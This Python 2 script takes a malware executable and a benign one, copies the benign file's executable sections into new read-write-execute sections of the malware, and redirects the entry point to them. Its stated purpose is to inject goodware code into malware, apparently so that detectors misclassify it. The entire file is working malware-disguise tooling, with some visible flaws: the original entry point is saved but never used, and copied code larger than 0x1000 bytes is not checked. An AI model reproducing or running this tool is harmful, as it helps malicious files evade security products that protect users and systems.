#!/usr/bin/env python
#coding: utf-8

import pefile
import mmap
import os, argparse

def isExecutable(section):
    flag = getattr(section, "Characteristics")
    if flag & 0x00000020 > 0 or flag & 0x20000000 > 0:
        return True
    return False

def get_executable_sections(path):
    pe = pefile.PE(path)
    executables = []
    for section in pe.sections:
        if isExecutable(section):
            executables.append(section)
    return executables

def get_data(path, section):
    pe = pefile.PE(path)
    return pe.get_data(section.VirtualAddress)

def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) / alignment) * alignment

def arg_parser():
    parser = argparse.ArgumentParser(description="injects executable section from goodware into malware")
    parser.add_argument("malware", type=str, help="name of the malware")
    parser.add_argument("goodware", type=str, help="name of the goodware")
    parser.add_argument("--amount", nargs="?", const=1, type=int, default=1)
    return parser.parse_args()

args = arg_parser()
executableSections = get_executable_sections(args.goodware)
exe_path = args.malware

# STEP 0x01 - Resize the Executable
# Note: I added some more space to avoid error

print "[+]Working on goodware sections append (GWA).."


original_size = os.path.getsize(exe_path)
goodware_size = os.path.getsize(args.goodware)
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + goodware_size + 0x1000)
map.close()
fd.close()

for i in range(len(executableSections)):
    if i >= args.amount:
        break

    shellcode = get_data(args.goodware, executableSections[i])

    # STEP 0x02 - Add the New Section Header

    pe = pefile.PE(exe_path)
    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

    # Look for valid values for the new section header
    raw_size = align(0x1000, file_alignment)
    virtual_size = align(0x1000, section_alignment)
    raw_offset = align((pe.sections[last_section].PointerToRawData +
                        pe.sections[last_section].SizeOfRawData),
                       file_alignment)

    virtual_offset = align((pe.sections[last_section].VirtualAddress +
                            pe.sections[last_section].Misc_VirtualSize),
                           section_alignment)

    # CODE | EXECUTE | READ | WRITE
    characteristics = 0xE0000020
    # Section name must be equal to 8 bytes
    goodPE = pefile.PE(args.goodware)
    name = ".data" + str(i)

    # Create the section
    # Set the name
    pe.set_bytes_at_offset(new_section_offset, name)
    # Set the virtual size
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    # Set the virtual offset
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    # Set the raw size
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    # Set the raw offset
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    # Set the following fields to zero
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
    # Set the characteristics
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)

    # STEP 0x03 - Modify the Main Headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

    pe.write(exe_path)

    pe = pefile.PE(exe_path)
    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    new_ep = pe.sections[last_section].VirtualAddress
    oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

    # STEP 0x04 - Inject the Shellcode in the New Section

    raw_offset = pe.sections[last_section].PointerToRawData
    pe.set_bytes_at_offset(raw_offset, shellcode)

    pe.write(exe_path)
